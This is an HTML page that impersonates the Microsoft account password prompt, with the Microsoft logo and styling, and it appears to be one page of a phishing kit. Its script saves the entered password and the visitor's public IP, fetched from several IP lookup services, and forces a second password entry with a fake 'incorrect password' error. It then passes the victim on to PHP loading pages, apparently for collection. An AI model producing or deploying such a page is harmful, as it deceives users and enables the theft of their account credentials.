<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Microsoft Account - Enter Password</title>
  <style>
    :root {
      --primary: #0078d4;
      --primary-hover: #106ebe;
      --text: #333;
      --light-gray: #f3f2f1;
      --border: #ccc;
      --link: #0067b8;
      --link-hover: #005a9e;
      --error: #e81123;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: #fff;
      color: var(--text);
      line-height: 1.6;
      padding: 2rem;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 450px;
      padding: 2rem;
      border: 1px solid var(--border);
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
      background: #fff;
    }

    .header {
      margin-bottom: 1.5rem;
    }

    .header h1 {
      font-size: 1.8rem;
      font-weight: 600;
      margin-bottom: 1rem;
    }

    .microsoft-logo {
      display: flex;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .microsoft-logo .square {
      width: 20px;
      height: 20px;
      margin-right: 8px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 2px;
    }

    .microsoft-logo .square div {
      border-radius: 2px;
    }

    .microsoft-logo .square div:nth-child(1) { background: #f25022; }
    .microsoft-logo .square div:nth-child(2) { background: #7fba00; }
    .microsoft-logo .square div:nth-child(3) { background: #00a4ef; }
    .microsoft-logo .square div:nth-child(4) { background: #ffb900; }

    .microsoft-logo span {
      font-size: 1.2rem;
      font-weight: 600;
      color: #555;
    }

    .account-info {
      display: flex;
      align-items: center;
      margin: 1rem 0 1.5rem;
      font-size: 0.95rem;
      color: #555;
    }

    .account-info .back-arrow {
      margin-right: 0.5rem;
      font-size: 1.1rem;
      cursor: pointer;
      color: #777;
    }

    .account-info .back-arrow:hover {
      color: var(--primary);
    }

    .form-group {
      margin-bottom: 1.5rem;
    }

    .form-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
    }

    .input-wrapper {
      position: relative;
    }

    .input-field {
      width: 100%;
      padding: 0.75rem 1rem;
      font-size: 1rem;
      border: 1px solid var(--border);
      border-radius: 4px;
      outline: none;
      transition: border-color 0.2s ease;
    }

    .input-field:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
    }

    .input-field::placeholder {
      color: #999;
    }

    .error-message {
      color: var(--error);
      font-size: 0.9rem;
      margin-top: 0.5rem;
      display: none;
    }

    .help-links {
      margin: 1rem 0;
      font-size: 0.9rem;
    }

    .help-links a {
      color: var(--link);
      text-decoration: none;
      font-weight: 500;
    }

    .help-links a:hover {
      color: var(--link-hover);
      text-decoration: underline;
    }

    .footer {
      display: flex;
      justify-content: flex-end;
      margin-top: 2rem;
    }

    .btn {
      padding: 0.75rem 1.5rem;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
      font-weight: 600;
      transition: background-color 0.2s ease;
    }

    .btn-signin {
      background: var(--primary);
      color: white;
    }

    .btn-signin:hover {
      background: var(--primary-hover);
    }

    @media (max-width: 480px) {
      .container {
        padding: 1.5rem;
        margin: 0 1rem;
      }

      .header h1 {
        font-size: 1.5rem;
      }

      .btn {
        padding: 0.75rem 1rem;
        font-size: 0.95rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Let's add your Microsoft account</h1>
      <div class="microsoft-logo">
        <div class="square">
          <div></div><div></div>
          <div></div><div></div>
        </div>
        <span>Microsoft</span>
      </div>
    </div>

    <div class="account-info">
      <span class="back-arrow">←</span>
      <span id="user-email">Loading...</span>
    </div>

    <div class="form-group">
      <label for="password-input">Enter password</label>
      <div class="input-wrapper">
        <input 
          type="password" 
          id="password-input" 
          class="input-field" 
          placeholder="Password"
          autocomplete="current-password"
        />
      </div>
      <div class="error-message" id="error-msg">
        Incorrect password. Please try again.
      </div>
    </div>

    <div class="help-links">
      <a href="#" id="forgot-password">Forgot password?</a><br/>
      <a href="#" id="use-app">Use my Microsoft app</a>
    </div>

    <div class="footer">
      <button class="btn btn-signin" id="signin-btn">Sign in</button>
    </div>
  </div>

  <script>
    const userEmail = localStorage.getItem('userEmail') || 'user@example.com';
    document.getElementById('user-email').textContent = userEmail;

    // ✅ Robust IP detection with multiple fallbacks
    async function fetchRealIP() {
      if (localStorage.getItem('userIP')) return;

      const apis = [
        { url: 'https://api.ipify.org?format=json', extract: data => data.ip },
        { url: 'https://jsonip.com', extract: data => data.ip },
        { url: 'https://api.my-ip.io/ip.json', extract: data => data.ip },
        { url: 'https://ipinfo.io/json', extract: data => data.ip }
      ];

      for (const { url, extract } of apis) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout

          const response = await fetch(url, {
            mode: 'cors',
            signal: controller.signal
          });

          clearTimeout(timeoutId);

          if (!response.ok) continue;

          const data = await response.json();
          const ip = extract(data);

          if (ip && ip !== '127.0.0.1' && ip.length > 6) {
            localStorage.setItem('userIP', ip);
            console.log("✅ Real IP detected:", ip);
            return;
          }
        } catch (err) {
          console.warn(`Failed to fetch IP from ${url}:`, err.message);
        }
      }

      // All failed
      localStorage.setItem('userIP', 'Unknown');
      console.error("❌ All IP services failed. Set to 'Unknown'.");
    }

    const showError = localStorage.getItem('showError') === 'true';
    if (showError) {
      document.getElementById('error-msg').style.display = 'block';
      localStorage.removeItem('showError');
    }

    document.querySelector('.back-arrow').addEventListener('click', function() {
      window.location.href = 'email.html';
    });

    document.getElementById('forgot-password').addEventListener('click', function(e) {
      e.preventDefault();
      alert("Redirecting to password reset page...");
    });

    document.getElementById('use-app').addEventListener('click', function(e) {
      e.preventDefault();
      alert("Launching Microsoft Authenticator or redirecting to app...");
    });

    document.getElementById('signin-btn').addEventListener('click', function() {
      const password = document.getElementById('password-input').value.trim();
      const errorMsg = document.getElementById('error-msg');

      if (!password) {
        errorMsg.textContent = "Please enter the password for your Microsoft account.";
        errorMsg.style.display = 'block';
        return;
      }

      errorMsg.style.display = 'none';
      localStorage.setItem('userPassword', password);

      let attemptCount = parseInt(localStorage.getItem('loginAttemptCount')) || 1;

      if (attemptCount === 1) {
        localStorage.setItem('loginAttemptCount', '2');
        window.location.href = 'loading.php';
      } else {
        localStorage.setItem('loginAttemptCount', '1');
        window.location.href = 'loading-success.php';
      }
    });

    document.addEventListener('DOMContentLoaded', () => {
      document.getElementById('password-input').focus();
      fetchRealIP(); // Start IP detection immediately
    });
  </script>
</body>
</html>